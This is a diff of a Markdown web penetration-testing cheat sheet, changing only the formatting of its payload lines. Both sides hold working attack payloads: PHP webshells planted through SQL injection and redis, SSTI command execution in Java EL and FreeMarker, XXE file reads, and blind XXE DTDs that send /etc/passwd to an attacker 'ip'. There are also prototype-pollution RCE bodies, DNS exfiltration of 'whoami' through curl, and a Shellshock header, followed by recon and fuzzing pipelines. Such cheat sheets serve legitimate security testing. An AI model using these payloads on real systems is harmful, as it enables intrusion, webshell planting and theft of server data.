@@ -736,23 +736,20 @@ https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS
   
 ### Webshell via SQLI
   
-select "\<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
+`select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";`
   
 ### SQL Injection Second-Order (query connector)
 
-codes/sqli/second_order/script.php
+-> script.php
 
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
 
 ### Webshell via redis
 
-redis-cli -h ip
-
-config set dir /var/www/html
-
-config set dbfilename ok.php
-
-set test "\<?php system($_GET['okay'); ?>" 
+`redis-cli -h ip`
+`config set dir /var/www/html`
+`config set dbfilename ok.php`
+`set test "\<?php system($_GET['okay'); ?>" `
 
 save
 
@@ -774,7 +771,7 @@ https://book.hacktricks.xyz/pentesting-web/sql-injection
  
 ### XPATH NOTATION
   
-%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
+`%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -`
   
 ### Wordlist for SQL Injection - Bypass
 
@@ -786,12 +783,10 @@ https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_B
   
 ### Others
   
-codes/sqli/time-based/sqli.py
-  
+-> sqli.py  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py
   
-codes/sqli/tampers/second-order.py
-
+-> second-order.py  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py
   
 ## NOSQL Injection
@@ -804,20 +799,16 @@ https://ivangoncharov.github.io/graphql-voyager/
   
 ## CSRF
 
-codes/csrf/csrf.html
-  
+-> csrf.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
   
-codes/csrf/csrf_json.html
-  
+-> csrf_json.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json.html
   
-codes/csrf/csrf_json_xhr.html
-  
+-> csrf_json_xhr.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html
   
-codes/csrf/csrf_token_bypass.html
-  
+-> csrf_token_bypass.html  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
   
 ### Analyze the token and perform brute-force
@@ -856,17 +847,16 @@ ${{3*3}}
 
 ### Java Expression Language
 
-{{T(java.lang.Runtime).getRuntime().exec('id')}}
-
-''.class.forName('java.lang.Runtime').getRuntime().exec('id')
+`{{T(java.lang.Runtime).getRuntime().exec('id')}}`
+`''.class.forName('java.lang.Runtime').getRuntime().exec('id')`
 
 ### FreeMarker
 
-\<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+`<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}`
 
 ### Python - Secret Key
   
-{{settings.SECRET_KEY}}
+`{{settings.SECRET_KEY}}`
   
 ### Doc for SSTI	
 
@@ -882,31 +872,26 @@ gopher://127.0.0.1:port/_
 
 ### Scripts
 
-codes/ssrf_protocol_smuggling/memcached.py
+-> memcached.py   
+
+->  
+`stats items`
   
+->  
+`stats cachedump <slab class> <number of items to dump>`
+  
+->  
+`get <item>`
+
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 
 
-codes/ssrf_protocol_smuggling/zabbix.py
-  
+-> zabbix.py  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/zabbix.py
 
 ### Tool's
 
--> Gopherus
-
+-> Gopherus  
 https://github.com/tarunkant/Gopherus
-  
-### Scripts
-
-codes/ssrf_protocol_smuggling/zabbix.py
-  
-codes/ssrf_protocol_smuggling/memcached.py
-  
--> stats items
-  
--> stats cachedump <slab class> <number of items to dump>
-  
--> get \<item>
   
 ### Docs for SSRF
 
@@ -916,85 +901,70 @@ https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
   
 ## CRLF Injection
   
-/%0d%0aLocation:
+`/%0d%0aLocation:attacker`
 
-/%0d%0a%0d%0a\<svg onload=(0)>
+`/%0d%0a%0d%0a\<svg onload=(0)>`
 
 ## XXE
 
 ### Methods:
 
-\<!ENTITY % file SYSTEM "file:///etc/passwd">
-\<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
-\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+`<!ENTITY % file SYSTEM "file:///etc/passwd">`
+`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">`
+`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`
 
 ## XXE - Blind Out-Of-Band
 
 ### Exfiltrate data exfiltrating data via dtd
 
--> Part 1
+-> Part 1 (Main Request)
 
-\<!DOCTYPE r[
-
-\<!ELEMENT r ANY>
-
-\<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
-
+```
+<!DOCTYPE r[
+<!ELEMENT r ANY>
+<!ENTITY % ult SYSTEM "http://ip/evil.dtd">
 %ult;
-
 %int;
-
 ]>
-
 <r>&exfil;</r>
-
--> Part 2
+```
   
-codes/xxe/evil.dtd
+-> Part 2 (evil.dtd)
   
+```
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">  
+<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">  
+```  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.dtd
-  
-\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-  
-\<!ENTITY % int "\<!ENTITY exfil SYSTEM 'http://ip/?leak=%file;'>">
-  
+
 ### Retrieve data via error messages with dtd file
-  
-codes/xxe/error.dtd
   
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/error.dtd
 
--> Part 1
-
-\<!DOCTYPE foo [
-
-\<!ENTITY % xxe SYSTEM "https://ip/evil.dtd"> 
-
+-> Part 1 (Request Principal)
+```
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "https://ip/error.dtd"> 
 %xxe;
-
 %payload;
-
 %remote;
-
 ]>
+```
+-> Part 2 (error.dtd)
 
--> Part 2
-
-\<!ENTITY % file SYSTEM "file:///etc/passwd">
-
-\<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % payload "\<!ENTITY &#37; remote SYSTEM 'file:///idonotexist/%file;'>">
+  ```
   
 ### XInclude to retrieve files with dtd file
 
-\<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>
+`<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/>\</foo>`
 
 ### Image file upload
 
-code/xxe/evil.svg
-
+```<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;</text></svg>```  
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/xxe/evil.svg
-  
-\<?xml version="1.0" standalone="yes"?>\<!DOCTYPE test [ \<!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>\<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\<text font-size="16" x="0" y="16">&xxe;\</text>\</svg>
 
 ## XSLT Server Side Injection
   
@@ -1011,84 +981,73 @@ https://github.com/BlackFan/client-side-prototype-pollution
 -> exec.exec in req body with lodash - application/json
   
 https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
-
+```
 "__proto__":{
-  
   "shell":"sleep 5"
-  
 }
+```
   
--> exec.fork in req body with lodash - application/json
-  
+-> exec.fork in req body with lodash - application/json  
 https://nodejs.org/api/process.html
-  
-"__proto__":{
-  
+```
+  "__proto__":{
     "execPath":"/bin/bash",
-  
     "execArgv":[
-  
     "-c",
-  
-    "sleep 5"
-  
+    "sleep 5"  
     ]
-  
   }
+```
 
 ### RCE - Exfiltrating via dns
 
-curl http://$(whoami).site.com/
+`curl http://$(whoami).site.com/`
 
-curl http://\`whoami\`.site.com/
+`curl http://\`whoami\`.site.com/`
 
 ### Shellshock
 
-User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com
+`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).site.com`
 
 ### CMS
 
 #### Wordpress
 
 -> Tool
-
-wpscan --url http://site.com/wordpress --api-token your_token --enumarate vp --plugins-detection aggressive
-
+`wpscan --url http://site.com/wordpress --api-token <your_token> --enumarate vp --plugins-detection aggressive`  
 https://wpscan.com/wordpress-security-scanner
 
 #### Joomla!
 
--> Tool
-
+-> Tool  
 https://github.com/oppsec/juumla
 
 #### Drupal
 
--> Tool
-
+-> Tool  
 https://github.com/SamJoan/droopescan
 
 ## Fuzzing (+) 
   
 ### DNS
 
-ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+`ffuf -u "https://FUZZ.site.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
 
 ### VHOST
   
-ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx
+`ffuf  -u "https://site.com" -H 'Host: FUZZ.site.com' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt -fs xxx`
 
 ### Fuzzing File Extension
   
-ffuf -u "https://site.com/indexFUZZ" -w web-extensions.txt -fs xxx
+`ffuf -u "https://site.com/indexFUZZ" -w web-extensions.txt -fs xxx`
 
 ### Fuzzing Parameter GET
 
-ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx  
+`ffuf -u "https://site.com/index.php?FUZZ=ok" -w wordlist.txt -fs xxx`
   
 ### Fuzzing Parameter POST
   
-ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx
+`ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlist.txt -fs xxx`
 
 ## Web Recon (+)
   
@@ -1096,9 +1055,9 @@ ffuf -u "https://site.com/index.php" -X POST -d 'FUZZ=ok' -H 'Content-Type: appl
 
 #### Parameters Discovery
 
-python paramspider.py -d stripe.com | uro | httpx -fc 404 | anew spider_parameters.txt
+`python paramspider.py -d stripe.com | uro | httpx -fc 404 | anew spider_parameters.txt`
 
-echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt
+`echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt`
 
 ### Other Steps
 
@@ -1106,47 +1065,46 @@ echo stripe.com | gau | gf xss | uro |  httpx -fc 404 | anew gau_parameters.txt
 
 1.1-> sublist3r
 
-subslit3r -d site.com -o sublist3r_subdomains.txt
+`subslit3r -d site.com -o sublist3r_subdomains.txt`
 
 1.2-> ctfr
 
-python ctfr.py -d site.com -o ctfr_subdomains.txt
+`python ctfr.py -d site.com -o ctfr_subdomains.txt`
 
 1.3-> Merge sublist3r+ctfr
 
-cat sublist3r_subdomains.txt ctfr_subdomains.txt > merge_subdomains.txt
+`cat sublist3r_subdomains.txt ctfr_subdomains.txt > merge_subdomains.txt`
 
 1.4-> Filter and Status Check
 
-cat merge_subdomains.txt | sort | uniq | grep -v "*" | httpx -o checked_subdomains.txt
+`cat merge_subdomains.txt | sort | uniq | grep -v "*" | httpx -o checked_subdomains.txt`
 
 #### 2 - URL Discovery - Fetches known URLs
 
 2.1 -> gau
 
-cat checked_subdomains.txt | gau > gau_urls.txt
+`cat checked_subdomains.txt | gau > gau_urls.txt`
 
 2.2 -> Filter and Status Check
 
-cat gau_urls.txt | gf xss | httpx -o checked_urls.txt
+`cat gau_urls.txt | gf xss | httpx -o checked_urls.txt`
 
 #### 3 - Parameter Discovery
 
 3.1 -> gau+gf+uro+httpx
 
-cat gau_urls.txt | gf xss | uro | httpx -fc 404 -o parameters_gau.txt 
+`cat gau_urls.txt | gf xss | uro | httpx -fc 404 -o parameters_gau.txt`
 
 3.2 -> paramspider + uro + httpx
 
-cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d 
-
-cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt
+`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`
+`cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt`
 
 #### 4 - Files Discovery
 
 4.1 -> gau+grep+httpx
 
-cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt
+`cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`
 
 -> Used Tools
 
